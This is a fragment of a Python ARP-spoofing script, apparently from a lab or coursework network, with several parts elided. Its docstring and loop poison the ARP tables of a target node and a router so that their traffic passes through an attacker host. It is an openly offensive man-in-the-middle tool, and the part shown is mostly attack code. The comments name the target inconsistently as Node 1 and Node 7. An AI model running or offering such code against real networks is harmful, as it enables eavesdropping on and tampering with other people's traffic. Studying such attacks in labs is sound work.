...
Poisons ARP tables of Node 1 (10.162.0.71) and the router (10.162.0.254)
so all traffic flows through us (attacker at 10.162.0.72).
"""
...
TARGET_IP    = "10.162.0.71"   # Node 1 (BootNode in AS162)
...
def main():
    ...
    try:
        while True:
            # Tell Node 7:   "the router is at MY mac"
            spoof(TARGET_IP,  GATEWAY_IP, target_mac,  attacker_mac)
            # Tell router:   "Node 7 is at MY mac"
